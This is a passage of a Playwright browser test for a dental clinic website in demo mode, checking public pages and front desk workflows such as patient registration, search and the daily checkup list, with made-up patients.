// End-to-end check of the website in DEMO mode with a real headless browser.
// Usage: node tests/ui.spec.mjs [baseUrl] [screenshotDir]
import { chromium } from 'playwright';
import assert from 'node:assert/strict';
import fs from 'node:fs';

const BASE = process.argv[2] || 'http://localhost:8765/';
const SHOTS = process.argv[3] || null;
if (SHOTS) fs.mkdirSync(SHOTS, { recursive: true });

const browser = await chromium.launch({ executablePath: process.env.CHROME_PATH || undefined });
const errors = [];
let passed = 0;
// A step that makes the app fail on purpose (a function that is too old, a dropped connection) expects the console.error the app writes for it.
const expectErrors = (re) => { for (let i = errors.length - 1; i >= 0; i -= 1) if (re.test(errors[i])) errors.splice(i, 1); };

async function newPage(viewport = { width: 1366, height: 860 }, options = {}, from = browser) {
  const page = await from.newPage({ viewport, ...options });
  // Demo mode needs nothing from the internet; outside hosts (fonts, CDN) are cut off so a slow network cannot hang the test.
  await page.route((url) => !/^(localhost|127\.0\.0\.1)$/.test(url.hostname) && url.protocol.startsWith('http'), (r) => r.abort());
  // The live site has its Supabase keys filled in; the test always runs the made-up DEMO data instead.
  await page.route('**/js/config.js', async (r) => {
    const res = await r.fetch();
    const body = (await res.text()).replace(/SUPABASE_URL: '[^']*'/, "SUPABASE_URL: ''").replace(/SUPABASE_ANON_KEY: '[^']*'/, "SUPABASE_ANON_KEY: ''");
    await r.fulfill({ response: res, body });
  });
  page.setDefaultTimeout(15000);
  page.on('pageerror', (e) => errors.push(`pageerror: ${e.message}`));
  page.on('console', (m) => { if (m.type() === 'error' && !/fonts\.(googleapis|gstatic)|ERR_|Failed to load resource/.test(m.text())) errors.push(`console: ${m.text()}`); });
  // A refused or reset load from the site's own host would otherwise show up only as a 15 s timeout.
  page.on('requestfailed', (r) => {
    if (/^https?:\/\/(localhost|127\.0\.0\.1)[:/]/.test(r.url()) && !/ERR_ABORTED/.test(r.failure()?.errorText || '')) errors.push(`requestfailed: ${r.url()} ${r.failure()?.errorText}`);
  });
  return page;
}
async function step(name, fn) {
  try { await fn(); passed++; console.log('ok -', name); } catch (e) {
    console.log('FAIL -', name, '\n   ', e.message.split('\n')[0]); process.exitCode = 1;
    // Close any dialog the failed step left open, so it cannot block the next step (a checkup form with answers asks first: Discard).
    for (const pg of browser.contexts().flatMap((c) => c.pages())) {
      await pg.keyboard.press('Escape').catch(() => {});
      await pg.locator('.modal', { hasText: 'Discard this checkup form?' }).getByRole('button', { name: 'Discard' }).click({ timeout: 1000 }).catch(() => {});
    }
  }
}
const shot = async (page, name) => { if (SHOTS) await page.screenshot({ path: `${SHOTS}/${name}.png`, fullPage: false }); };
async function loginAs(page, label) {
  await page.goto(BASE + '#/login/staff');
  await page.getByRole('button', { name: new RegExp(label) }).click();
  await page.waitForSelector('.topbar');
}
// "Try another role" takes the staff screen away at once, but the logout itself ends a moment later by moving to the home page. A step that
// goes to the login page before then is sent back to the home page, so wait for the home page (its doors) before going anywhere.
async function tryAnotherRole(page) {
  await page.getByRole('button', { name: 'Try another role' }).click();
  await page.waitForSelector('.door');
}

// ------------------------------------------------------------- public
const page = await newPage();
await step('home shows the smile, three doors and calendar', async () => {
  await page.goto(BASE);
  // With WebGL the hero is the photo card (canvas) and the CSS arch is hidden; without it the 24 CSS teeth show.
  await page.waitForSelector('.smile-stage.has-card canvas, .smile-stage:not(.has-card) .tooth');
  // The week with Dr. Ali fills in when the (demo) database answers, after the hero is already there: wait for it, or a slow first load
  // counts 0 days (this first step failed now and then on a slow first load, and its messages did not say which count was wrong).
  await page.locator('.sx-day').first().waitFor();
  assert.equal(await page.locator('.tooth').count(), 24, 'tooth count');
  for (const t of ['Patient', 'Visitor', 'Our results', 'Employee']) assert.ok(await page.locator('.door', { hasText: t }).count(), `door ${t}`);
  assert.equal(await page.locator('.sx-day').count(), 7, 'sx-day count');
  await shot(page, '01-home');
});
await step('Our results: a grid of square photos; a click opens the photo large, Close goes back', async () => {
  await page.click('.door:has-text("Our results")');
  await page.waitForSelector('h1:has-text("Our results")');
  const tiles = page.locator('.results-grid .results-tile');
  await tiles.first().waitFor();
  const box = await tiles.first().boundingBox();
  assert.ok(box && Math.abs(box.width - box.height) < 2, `square thumbnails: ${box && box.width}x${box && box.height}`);
  await tiles.first().click();
  const dlg = page.getByRole('dialog', { name: 'Our results' });
  await dlg.waitFor();
  assert.ok(await dlg.locator('img.results-big').getAttribute('src'), 'the large photo is shown');
  assert.match(await dlg.locator('.results-caption').innerText(), /1 of \d+/);
  await dlg.getByRole('button', { name: 'Close' }).click();
  await dlg.waitFor({ state: 'detached' });
  await page.goto(BASE);
  await page.waitForSelector('.door:has-text("Visitor")');
});
await step('visitor page lists benefits, braces options and WhatsApp button', async () => {
  await page.click('.door:has-text("Visitor")');
  await page.waitForSelector('.brace-card');
  assert.ok((await page.locator('.benefit').count()) >= 6);
  assert.ok(await page.locator('a:has-text("Message on WhatsApp")').count());
  await shot(page, '02-visitor');
});
// The owner (15 Oct 2026): the doors already lead to the patient login and the treatments, so the top bar links to the two forms
// instead, and the two buttons that were under the doors are gone. [text, href, aria-current] of each top bar link:
const barLinks = (pg) => pg.locator('.site-header nav a').evaluateAll((as) => as.map((a) => [a.textContent, a.getAttribute('href'), a.getAttribute('aria-current')]));
const BAR = [['Join our team', '#/join', null], ['Complaints & suggestions', '#/feedback', null]];
await step('top bar: "Join our team" and "Complaints & suggestions" on every public page, the form on screen marked; the doors still lead to the patient login and the treatments', async () => {
  assert.deepEqual(await barLinks(page), BAR, 'on the visitor page');
  await page.locator('.site-header nav a', { hasText: 'Complaints & suggestions' }).click();
  await page.waitForSelector('h1:has-text("Complaints & suggestions")');
  assert.deepEqual(await barLinks(page), [BAR[0], ['Complaints & suggestions', '#/feedback', 'page']], 'on the feedback form');
  await page.locator('.site-header nav a', { hasText: 'Join our team' }).click();
  await page.waitForSelector('h1:has-text("Join our team")');
  assert.deepEqual(await barLinks(page), [['Join our team', '#/join', 'page'], BAR[1]], 'on the job form');
  await page.goto(BASE + '#/results');
  await page.waitForSelector('h1:has-text("Our results")');
  assert.deepEqual(await barLinks(page), BAR, 'on Our results');
  await page.goto(BASE + '#/clinics');
  await page.waitForSelector('#branches');
  assert.deepEqual(await barLinks(page), BAR, 'on the clinics (the homepage, scrolled)');
  await page.locator('.wordmark').click();
  await page.waitForSelector('.door');
  assert.deepEqual(await barLinks(page), BAR, 'on the homepage');
  assert.equal(await page.locator('.site-header a[href="#/login/patient"], .site-header a[href="#/visitor"]').count(), 0, 'the top bar does not repeat the doors');
  assert.equal(await page.locator('.hero-forms, .hero-body .btn').count(), 0, 'no form buttons under the doors');
  const doors = await page.locator('.door-row a.door').evaluateAll((as) => as.map((a) => [a.querySelector('strong').textContent, a.getAttribute('href')]));
  assert.deepEqual(doors, [['Patient', '#/login/patient'], ['Visitor', '#/visitor'], ['Our results', '#/results'], ['Employee', '#/login/staff']], 'the four doors are unchanged');
  await page.locator('.door', { hasText: 'Patient' }).click();
  await page.waitForSelector('h1:has-text("Patient login")');
});

// ------------------------------------------------------------- front desk
await step('front desk sees only their branch and the Aaj ki List', async () => {
  await loginAs(page, 'Front desk \\(North Nazimabad\\)');
  await page.locator('.topnav .menu:has-text("Aaj ki List") > button').click();
  await page.locator('.topnav .menu-list a:text-is("Aaj ki List")').click(); // (not "History of Aaj ki List" next to it)
  await page.waitForSelector('table.sheet tbody tr');
  const options = await page.locator('.sheet-toolbar select').first().locator('option').allTextContents();
  assert.deepEqual(options, ['North Nazimabad']);
  assert.ok((await page.locator('table.sheet tbody tr').count()) >= 5);
  // P.P, the sheet's dues column: red, written like the sheet (15k)
  assert.ok(await page.locator('table.sheet tbody td.pp .pp-due').count(), 'dues visible in P.P');
  assert.match(await page.locator('table.sheet tbody td.pp .pp-due').first().getAttribute('title'), /^Pending dues Rs/);
  await shot(page, '03-sheet-frontdesk');
});
await step('front desk registers a new patient and gets the next Mr# (the website numbers from 50000, clear of Healthwire)', async () => {
  await page.fill('.add-panel input[type=search]', 'Komal Test');
  await page.click('.suggestions button:has-text("New patient")');
  await page.fill('.modal input[type=tel]', '0300 1234567');
  await page.click('.modal button:has-text("Create patient")');
  await page.waitForSelector('.toast:has-text("Mr# 50000")');
  await page.waitForSelector('table.sheet tbody tr:has-text("Komal Test")');
});
await step('front desk adds a walk-in with the "+ New walk-in" button', async () => {
  await page.click('.add-panel button:has-text("New walk-in")');
  await page.fill('.modal input[required]:not([type=tel])', 'Walkin Person');
  await page.fill('.modal input[type=tel]', '0301 7654321');
  await page.click('.modal button:has-text("Create patient")');
  await page.waitForSelector('table.sheet tbody tr:has-text("Walkin Person")');
});
await step('front desk cannot see accounts or admin', async () => {
  const nav = (await page.locator('.topnav a, .topnav .menu-list a').allTextContents()).map((t) => t.trim());
  assert.ok(!nav.includes('Access list') && !nav.includes('Staff accounts'));
  assert.ok(!nav.includes('Complaints'));
  assert.ok(!nav.includes('Financial'));
});
await step('front desk may make a patient portal login (owner decision, 9 Oct 2026): the button shows on the patient just registered and the username carries Mr# 50000', async () => {
  await page.goto(BASE + '#/staff/patients?q=Komal%20Test');
  await page.locator('table.list tbody tr', { hasText: 'Komal Test' }).locator('a').first().click();
  await page.waitForSelector('h1:has-text("Komal Test")');
  await page.locator('.portal-login-line', { hasText: 'Portal login: none yet' }).waitFor();
  await page.getByRole('button', { name: 'Create portal login' }).click();
  const m = page.locator('.modal');
  assert.equal(await m.locator('input[readonly]').inputValue(), 'komaltest-50000@dralirashid.com');
  await m.getByRole('button', { name: 'Cancel' }).click();
  await m.waitFor({ state: 'detached' });
});
await step('top bar: patient search by name, Mr# and phone from any screen', async () => {
  const box = page.locator('.topsearch input');
  await box.fill('9812');
  await page.waitForSelector('.search-results a:has-text("Mr# 9812")');
  await box.fill('Hamza');
  await page.waitForSelector('.search-results a:has-text("Hamza Qureshi")');
  await box.fill('03010734521');
  await page.waitForSelector('.search-results a:has-text("Hamza Qureshi")');
  await page.locator('.search-results a').first().click();
  await page.waitForSelector('h1:has-text("Hamza Qureshi")');
  await box.fill('Zainab');
  await box.press('Enter');
  await page.waitForSelector('table.list tbody tr:has-text("Zainab Rizvi")');
  assert.equal(await page.locator('table.list tbody tr').count(), 1, 'Enter opens the Patients page with the search');
  await page.goto(BASE + '#/staff/sheet');
  await page.waitForSelector('table.sheet tbody tr');
});
await step('auto-save: editing treatment details shows saved state', async () => {
  const input = page.locator('table.sheet tbody tr:has-text("Komal Test") input[aria-label^="Treatment details"]');
  await input.fill('U L 018 PC refresh');
  await page.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
});
await step('flag patient for Dr. Ali from the sheet', async () => {
  await page.click('table.sheet tbody tr:has-text("Komal Test") .frozen .link-btn');
  await page.click('.modal button:has-text("Next appointment with Dr. Ali")');
  await page.locator('.modal').last().locator('textarea').fill('Bracket keeps breaking');
  await page.click('.modal button:has-text("Flag for Dr. Ali")');
  await page.waitForSelector('.toast:has-text("Flagged")');
  await page.keyboard.press('Escape');
});

// ------------------------------------------------------------- checkup patients on the Aaj ki List (front desk, North Nazimabad)
// (Checkup patients have no Mr#. Made-up names only; the demo keeps its data in memory, so the browser is never reloaded here.)
const checkupRow = (pg, name) => pg.locator(`table.sheet tbody tr.is-checkup:has(input[aria-label="Name of checkup patient ${name}"])`);
// The checkup form ("Checkup Patient Form 2.0", owner 11 Oct 2026) has nine questions, all required for a new checkup. This fills them; the
// doctor is the first one the website lists (no name is written into the test; doctorCount ticks the first n) unless doctorOther gives the
// "Other" text. "Who did your checkup?" and "What was your checkup for?" are tick boxes, as on the Google Form: checkupFor may be a list.
const doctorGroup = (m) => m.getByRole('group', { name: /^Who did your checkup/ });
const forGroup = (m) => m.getByRole('group', { name: /^What was your checkup for/ });
const tickLabels = (group) => group.getByRole('checkbox').evaluateAll((els) => els.map((e) => e.labels[0].textContent.trim()));
const ticked = (group) => group.getByRole('checkbox', { checked: true }).evaluateAll((els) => els.map((e) => e.labels[0].textContent.trim()));
// Would a reload or closing the tab get the browser's "Leave site?" question now (a beforeunload listener that cancels)?
const reloadAsks = (pg) => pg.evaluate(() => { const e = new Event('beforeunload', { cancelable: true }); window.dispatchEvent(e); return e.defaultPrevented; });
async function fillCheckupForm(m, { name, phone, checkupFor = 'General checkup', forOther = null, doctorOther = null, doctorCount = 1, ali = 'Yes', pricing = 'Yes', wants = 'Yes', plan = 'Next month' }) {
  await m.getByLabel(/^Patient full name/).fill(name);
  if (phone !== undefined) await m.getByLabel(/^Mobile number/).fill(phone);
  if (doctorOther) {
    await doctorGroup(m).getByLabel('Other', { exact: true }).check();
    await m.getByLabel(/^Other: who did the checkup/).fill(doctorOther);
  } else for (let i = 0; i < doctorCount; i++) await doctorGroup(m).getByRole('checkbox').nth(i).check();
  await m.getByRole('group', { name: /^Did Dr\. Ali recommend your treatment/ }).getByLabel(ali, { exact: true }).check();
  if (forOther) {
    await forGroup(m).getByLabel('Other', { exact: true }).check();
    await m.getByLabel(/^Other: what was the checkup for/).fill(forOther);
  } else for (const c of [].concat(checkupFor)) await forGroup(m).getByLabel(c, { exact: true }).check();
  await m.getByRole('group', { name: /^Did you understand the pricing details/ }).getByLabel(pricing, { exact: true }).check();
  await m.getByRole('group', { name: /^Would you like to start the treatment/ }).getByLabel(wants, { exact: true }).check();
  await m.getByLabel(/^If yes, then when/).fill(plan);
}
// "+ Add checkup patient" at the front desk (the Today page, today's Aaj ki List; owner 15 Oct 2026): the name and the mobile number only.
const quickFields = (m) => m.locator('.field-label').evaluateAll((els) => els.map((e) => e.firstChild.textContent.trim()));
async function quickAdd(pg, name, phone) {
  await pg.getByRole('button', { name: '+ Add checkup patient' }).click();
  const m = pg.locator('.modal');
  await m.getByLabel(/^Patient full name/).fill(name);
  await m.getByLabel(/^Mobile number/).fill(phone);
  await m.getByRole('button', { name: 'Add to the list' }).click();
  return m;
}
async function removeCheckup(pg, row) {
  await row.getByRole('button', { name: /Checkup options/ }).click();
  await pg.locator('.modal').getByRole('button', { name: 'Remove from the list' }).click();
  await pg.locator('.modal').getByRole('button', { name: 'Remove', exact: true }).click();
  await row.waitFor({ state: 'detached' });
}
await step('front desk: the Aaj ki List shows the checkup patients of the day with no Mr# and no badge (as on the sheet), sorted like the sheet with a serial number on every row', async () => {
  await page.goto(BASE + '#/staff/sheet');
  await page.waitForSelector('table.sheet tbody tr.is-checkup');
  const seeded = page.locator('table.sheet tbody tr.is-checkup');
  assert.ok((await seeded.count()) >= 2, 'the two seeded checkups of North Nazimabad');
  // Owner, 11 Oct 2026: no flags on the list. The row without an Mr# is the checkup patient, as on the sheet; a screen
  // reader hears "Checkup patient" with the name.
  assert.equal(await page.locator('table.sheet tbody .badge').count(), 0, 'no badge on the list');
  assert.deepEqual(await seeded.first().locator('th.name-col .sr-only').evaluateAll((els) => els.map((el) => el.textContent)), ['Checkup patient']);
  assert.match(await seeded.first().locator('td.mr-cell').innerText(), /no Mr#/);
  assert.equal(await seeded.first().locator('.quick-tap').count(), 0, 'no quick-tap button on a checkup row');
  // Owner, 11 Oct 2026: Waiting first, then In treatment, then Scheduled / no status, then Completed, then Cancelled and
  // No show; checkup patients by their own day status (not a block at the end), and inside one status the patients before
  // the checkup patients. Every row is numbered 1..n in that order in the "#" column, like the sheet's row numbers.
  const order = await page.locator('table.sheet tbody tr[data-id]').evaluateAll((trs) => trs.map((t) => ({
    checkup: t.classList.contains('is-checkup'),
    status: t.querySelector('select[aria-label^="Status for"]')?.value ?? '',
    serial: t.querySelector('td.rownum')?.textContent.replace(/\D/g, '') ?? '',
  })));
  const rank = { waiting: 0, in_treatment: 1, scheduled: 2, '': 3, completed: 4, cancelled: 5, no_show: 6 };
  const keys = order.map((r) => rank[r.status] * 2 + (r.checkup ? 1 : 0));
  assert.ok(keys.every((k, i) => i === 0 || keys[i - 1] <= k), `rows are sorted by status, patients before checkups: ${order.map((r) => r.status + (r.checkup ? '/c' : '')).join(', ')}`);
  assert.ok(order.findIndex((r) => r.checkup) < order.map((r) => r.checkup).lastIndexOf(false), 'a waiting checkup patient comes before the patients done (not at the end)');
  assert.deepEqual(order.map((r) => r.serial), order.map((_, i) => String(i + 1)), 'every row has its serial number 1..n');
  assert.ok(await page.locator('table.sheet thead th:has-text("Token")').count(), 'the token has its own column');
  assert.match(await page.locator('.sheet-counts').innerText(), /Checkups \d+/);
  await shot(page, '14-sheet-checkups');
});
await step('front desk: a checkup row\'s Doctor Name shows the names typed there as chips in each doctor\'s colour (grey for a name not on the clinic\'s list), and the text to type in once the cell is chosen', async () => {
  // Owner, 11 Oct 2026: "doctor names should have similar colours so they dont look all the same", on every row.
  const want = await page.evaluate(async () => {
    const m = await import('/js/views/staff/sheet.js');
    const { state } = await import('/js/state.js');
    const c = state.ref.clinicians.find((x) => x.display_name === 'Dr. Rabia (sample)');
    return `gs-${m.doctorTone(c.id, c.display_name)}`;
  });
  const cellOf = () => page.evaluate(() => {
    const box = [...document.querySelectorAll('table.sheet tbody tr.is-checkup .doctors-box')].find((b) => b.querySelector('input').value.startsWith('Dr. Rabia (sample)'));
    const chips = box.querySelector('.written-people');
    return { typed: box.querySelector('input').value, chips: [...chips.querySelectorAll('.person')].map((p) => [p.textContent, (p.className.match(/\bgs-\w+/) || [''])[0]]),
      chipsShown: getComputedStyle(chips).display !== 'none', textShown: getComputedStyle(box.querySelector('input')).color !== 'rgba(0, 0, 0, 0)' };
  });
  assert.notEqual(want, 'gs-grey');
  assert.deepEqual(await cellOf(), { typed: 'Dr. Rabia (sample)', chips: [['Rabia (sample)', want]], chipsShown: true, textShown: false }, 'the doctor\'s chip, as on the other rows');
  const box = page.locator('table.sheet tbody tr.is-checkup .doctors-box', { hasText: 'Rabia (sample)' });
  const input = box.locator('input');
  await box.click(); // (through the chips, to the cell)
  assert.ok(await input.evaluate((el) => el === document.activeElement), 'the cell has the cursor');
  assert.deepEqual(await cellOf(), { typed: 'Dr. Rabia (sample)', chips: [['Rabia (sample)', want]], chipsShown: false, textShown: true }, 'the text to type in');
  await page.keyboard.press('End');
  await page.keyboard.type(', Dr. Made Up');
  await page.keyboard.press('Tab');
  assert.deepEqual(await cellOf(), { typed: 'Dr. Rabia (sample), Dr. Made Up', chips: [['Rabia (sample)', want], ['Made Up', 'gs-grey']], chipsShown: true, textShown: false });
  await page.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  // (back as it was, for the steps below)
  await input.fill('Dr. Rabia (sample)');
  await input.press('Tab');
  assert.deepEqual((await cellOf()).chips, [['Rabia (sample)', want]]);
  await page.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  await page.evaluate(() => document.activeElement?.blur());
});
await step('front desk: "+ Add checkup patient" on today\'s Aaj ki List asks only the name and the mobile number and puts the name on the list as Waiting (no Mr#); details and status save; the row can be removed', async () => {
  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
  const m = page.locator('.modal');
  await m.waitFor();
  assert.equal(await m.locator('h2').innerText(), 'Add a checkup patient');
  assert.deepEqual(await quickFields(m), ['Patient full name', 'Mobile number'], 'the name and the mobile number only (the branch is the list\'s)');
  assert.equal(await m.locator('fieldset, input[type=checkbox], input[type=radio], details, select').count(), 0, 'none of the checkup form\'s questions');
  assert.match(await m.locator('.modal-body .muted').first().innerText(), /today's Aaj ki List for North Nazimabad, as Waiting\. After the checkup, fill in the checkup form from their row there \("Fill in form"\)\./);
  assert.deepEqual(await m.locator('.modal-actions button').allInnerTexts(), ['Cancel', 'Add to the list']);
  assert.equal(await page.evaluate(() => document.activeElement?.closest('.field')?.querySelector('.field-label')?.firstChild.textContent), 'Patient full name', 'the cursor starts in the name');
  await m.getByRole('button', { name: 'Add to the list' }).click();
  await m.locator('.field-error').first().waitFor();
  assert.deepEqual(await m.locator('.field-error').allInnerTexts(), ['Write the patient name.', 'Write a full phone number with at least 10 digits, e.g. 0300 1234567.']);
  await m.getByLabel(/^Patient full name/).fill('Checkup Test Person');
  await m.getByLabel(/^Mobile number/).fill('0300 5550101');
  await m.getByLabel(/^Mobile number/).press('Enter');   // (Enter adds)
  await page.waitForSelector('.toast:has-text("Checkup Test Person added to today\'s list for North Nazimabad.")');
  await page.waitForSelector('.modal', { state: 'detached' });
  const row = checkupRow(page, 'Checkup Test Person');
  await row.waitFor();
  assert.equal(await row.locator('input[aria-label^="Treatment for"]').inputValue(), 'Checkup', 'the treatment is "Checkup" until the form says what it was for');
  assert.equal(await row.locator('input[aria-label^="Phone for"]').inputValue(), '0300 5550101');
  assert.equal(await row.locator('select[aria-label^="Status for"]').inputValue(), 'waiting', 'Waiting: the checkup is still to come');
  assert.doesNotMatch(await row.locator('td.mr-cell').innerText(), /\d/);
  assert.ok(await row.getByRole('button', { name: 'Fill in form for Checkup Test Person' }).isVisible(), 'the checkup form waits on the row');
  await row.locator('input[aria-label^="Treatment details"]').fill('Scaling advised');
  await page.waitForTimeout(1200);
  await page.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  assert.equal((await page.locator('.save-state').innerText()).trim(), 'All changes saved');
  await row.locator('select[aria-label^="Status for"]').selectOption('completed');
  await page.waitForTimeout(300);
  // Today reloads the list from the data layer: the typed details and the status are really saved.
  await page.getByRole('button', { name: 'Today', exact: true }).click();
  await row.waitFor();
  assert.equal(await row.locator('input[aria-label^="Treatment details"]').inputValue(), 'Scaling advised');
  assert.equal(await row.locator('select[aria-label^="Status for"]').inputValue(), 'completed');
  assert.ok(await row.getByRole('button', { name: 'Fill in form for Checkup Test Person' }).isVisible(), 'Completed without the form: it still waits on the row');
  // Options -> Remove -> confirm
  await removeCheckup(page, row);
});
await step('front desk: a checkup patient whose phone belongs to a patient file is offered "Add Mr# N to the list instead"; with that note showing, Enter still adds the checkup at once', async () => {
  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
  const m = page.locator('.modal');
  await m.getByLabel(/^Patient full name/).fill('Dup Check Person');
  await m.getByLabel(/^Mobile number/).fill('03010734521');
  await m.locator('.alert-warning:has-text("already has a patient file")').waitFor();   // (named while typing)
  const text = await m.locator('.alert-warning').innerText();
  assert.match(text, /^This person already has a patient file: .+ \(Mr# \d+, /);
  const mr = text.match(/Mr# (\d+)/)[1];
  const before = await page.locator('table.sheet tbody tr:not(.is-checkup)', { hasText: `Mr# ${mr}` }).count();
  await m.getByRole('button', { name: `Add Mr# ${mr} to the list instead` }).click();
  // (this patient is on the list already, so the list asks first; a second row is what this test adds)
  await page.locator('.modal h2:has-text("is already on the list")').waitFor();
  await page.locator('.modal').getByRole('button', { name: 'Add another row' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  await page.waitForFunction(([n, count]) => [...document.querySelectorAll('table.sheet tbody tr:not(.is-checkup)')].filter((t) => t.textContent.includes(`Mr# ${n}`)).length === count, [mr, before + 1]);
  assert.equal(await page.locator('table.sheet tbody tr.is-checkup:has(input[aria-label="Name of checkup patient Dup Check Person"])').count(), 0, 'no checkup was made');
  // the note stays out of the way: Enter in the phone adds the checkup (one press), and no patient row is added
  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
  await m.getByLabel(/^Patient full name/).fill('File Note Person');
  await m.getByLabel(/^Mobile number/).fill('03010734521');
  await m.locator('.alert-warning:has-text("already has a patient file")').waitFor();
  await m.getByLabel(/^Mobile number/).press('Enter');
  await page.waitForSelector('.toast:has-text("File Note Person added to today\'s list for North Nazimabad.")');
  await page.waitForSelector('.modal', { state: 'detached' });
  const row = checkupRow(page, 'File Note Person');
  await row.waitFor();
  assert.equal(await page.locator('table.sheet tbody tr:not(.is-checkup)', { hasText: `Mr# ${mr}` }).count(), before + 1, 'no patient row was added');
  await removeCheckup(page, row);
});
await step('front desk: the status filter and the find box apply to the checkup rows, and the dues filter hides them', async () => {
  // (status, doctor, group, dues and braces sit behind "Filters")
  await page.getByRole('button', { name: /^Filters/ }).click();
  await page.locator('select[aria-label="Filter by status"]').selectOption('completed');
  const kinds = await page.locator('table.sheet tbody tr.is-checkup select[aria-label^="Status for"]').evaluateAll((els) => els.map((e) => e.value));
  assert.ok(kinds.every((v) => v === 'completed'), 'only completed checkups');
  await page.locator('select[aria-label="Filter by status"]').selectOption('');
  await page.locator('label:has-text("With dues") input').check();
  assert.equal(await page.locator('table.sheet tbody tr.is-checkup').count(), 0, 'the dues filter hides checkups');
  await page.locator('label:has-text("With dues") input').uncheck();
  await page.locator('input[aria-label="Find on this list"]').fill('checkup');
  assert.ok((await page.locator('table.sheet tbody tr.is-checkup').count()) >= 2, 'the word "checkup" finds checkup rows');
  await page.locator('input[aria-label="Find on this list"]').fill('');
});

await step('front desk: "Fill in form" on a checkup row, then "Register as patient" gives an Mr#, and "Put Mr# N on this list" turns the row into a patient row', async () => {
  await quickAdd(page, 'Register Flow Person', '0300 5550104');
  const row = checkupRow(page, 'Register Flow Person');
  await row.waitFor();
  await row.getByRole('button', { name: 'Fill in form for Register Flow Person' }).click();
  const f = page.locator('.modal', { hasText: 'Checkup form: Register Flow Person' });
  await fillCheckupForm(f, { name: 'Register Flow Person', forOther: 'Whitening' });
  await f.getByRole('button', { name: 'Save the answers' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  await row.getByRole('button', { name: /Checkup options/ }).click();
  await page.locator('.modal').getByRole('button', { name: 'Register as patient' }).click();
  const dlg = page.locator('.modal');
  await dlg.getByRole('button', { name: 'Create patient file' }).click();
  await dlg.locator('.registered-mr').waitFor();
  const mr = (await dlg.locator('.registered-mr').innerText()).match(/Registered: Mr# (\d+)/)[1];
  await dlg.getByRole('button', { name: `Put Mr# ${mr} on this list` }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  const visit = page.locator('table.sheet tbody tr:not(.is-checkup)', { hasText: `Mr# ${mr}` });
  await visit.waitFor();
  assert.equal(await visit.locator('input[aria-label^="Treatment for"]').inputValue(), 'Whitening', 'the visit carries what the checkup was for (the "Other" text of the form)');
  assert.equal(await row.count(), 0, 'the checkup row is now a patient row');
  await page.goto(BASE + '#/staff/checkups?q=5550104');
  const link = page.locator('table.checkup-table tbody tr[data-id] a.mr');
  await link.waitFor();
  assert.equal((await link.innerText()).trim(), `Mr# ${mr}`, 'the Checkups page keeps the person, now with the Mr#');
  await page.goto(BASE + '#/staff/sheet');
  await page.waitForSelector('table.sheet tbody tr');
});
await step('front desk: the arrow keys move between the name cells of checkup rows', async () => {
  await page.waitForSelector('table.sheet tbody tr.is-checkup');
  const names = page.locator('table.sheet tbody tr.is-checkup input[data-field="patient_name"]');
  assert.ok((await names.count()) >= 2);
  // (sorted by status, so patient rows, whose name is a button and not a typing cell, lie between them: they are passed over)
  assert.equal(await names.nth(0).evaluate((el) => el.closest('tr').nextElementSibling?.classList.contains('is-checkup')), false, 'a patient row below the first checkup row');
  await names.nth(0).focus();
  await page.keyboard.press('ArrowDown');
  assert.equal(await page.evaluate(() => document.activeElement?.getAttribute('aria-label')), await names.nth(1).getAttribute('aria-label'));
});

await step('front desk: the same person twice on today\'s list is refused in plain words (the same phone, or the same name of a row typed in without a phone); another name on the same phone (often a family member), or a name that only partly fits, is said too and is one more click', async () => {
  await quickAdd(page, 'Twice Typed Person', '0300 5550955');
  await page.waitForSelector('.toast:has-text("Twice Typed Person added to today\'s list for North Nazimabad.")');
  await page.waitForSelector('.modal', { state: 'detached' });
  const m = await quickAdd(page, 'Twice  Typed Person', '0300-555 0955');
  const refused = m.locator('.alert[role="alert"]');
  await refused.waitFor();
  assert.equal((await refused.innerText()).trim(), "Twice Typed Person (0300 5550955) is already on today's list for North Nazimabad, so they are not added again.");
  assert.deepEqual(await m.locator('.modal-actions button').allInnerTexts(), ['Cancel', 'Add to the list'], 'nothing else to choose');
  // a mistyped number put right: the refusal goes at once (it may not be true any more)
  await m.getByLabel(/^Mobile number/).fill('0300 5550999');
  assert.equal(await refused.count(), 0, 'not said any more once the phone is changed');
  await m.getByRole('button', { name: 'Cancel' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  assert.equal(await checkupRow(page, 'Twice Typed Person').count(), 1, 'one row, not two');
  // another name on the same phone (a family member, or the same person written another way): said, not added without a word; one more
  // click adds them as a checkup of their own
  const other = await quickAdd(page, 'Twice Typed Brother', '0300 5550955');
  const maybe = other.locator('.alert[role="alert"]');
  await maybe.waitFor();
  assert.match(await maybe.innerText(), /^Twice Typed Person \(0300 5550955\) is already on today's list for North Nazimabad on this phone number\. The same person\? Then they are on the list already: press Cancel\./);
  assert.match(await maybe.innerText(), /Someone else on the same phone \(often a family member\)\? Add Twice Typed Brother as someone else$/);
  assert.equal(await checkupRow(page, 'Twice Typed Brother').count(), 0, 'not added yet');
  await other.getByRole('button', { name: 'Add Twice Typed Brother as someone else' }).click();
  await page.waitForSelector('.toast:has-text("Twice Typed Brother added to today\'s list for North Nazimabad.")');
  await page.waitForSelector('.modal', { state: 'detached' });
  await checkupRow(page, 'Twice Typed Brother').waitFor();
  // someone typed into the Google Sheet on arrival without a phone: found by the name
  await page.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    await state.data.addCheckup({ checkup_date: localISO(), branch_id: 2, patient_name: 'Nophone Desk Person', phone: null, checkup_for: 'Checkup', day_status: 'waiting', follow_up: 'Not Contacted' });
  });
  const again = await quickAdd(page, 'Nophone Desk Person', '0300 5550956');
  await again.locator('.alert[role="alert"]').waitFor();
  assert.equal((await again.locator('.alert[role="alert"]').innerText()).trim(),
    "Nophone Desk Person (no phone) is already on today's list for North Nazimabad, so they are not added again. If that is someone else, first write their mobile number on their row, then add this person.");
  await again.getByRole('button', { name: 'Cancel' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  // a name that only partly fits the one without a phone: said, and one more click adds them
  const partly = await quickAdd(page, 'Nophone Desk Person Rizvi', '0300 5550957');
